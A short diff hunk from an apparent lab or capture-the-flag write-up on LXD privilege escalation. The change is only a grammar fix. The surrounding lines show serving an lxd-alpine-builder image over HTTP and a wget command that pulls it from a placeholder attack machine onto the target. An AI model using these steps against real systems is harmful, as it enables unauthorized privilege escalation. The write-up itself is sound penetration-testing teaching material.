@@ -199,7 +199,7 @@ $ cd lxd-alpine-builder
 $ python3 -m http.server
 ```
 
-Now I am going to download what I need from attack machine onto the target machine. Here are the command I used:
+Now I am going to download what I need from attack machine onto the target machine. Here is the command I used:
 
 ```bash
 $ wget http://<attack_machine_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
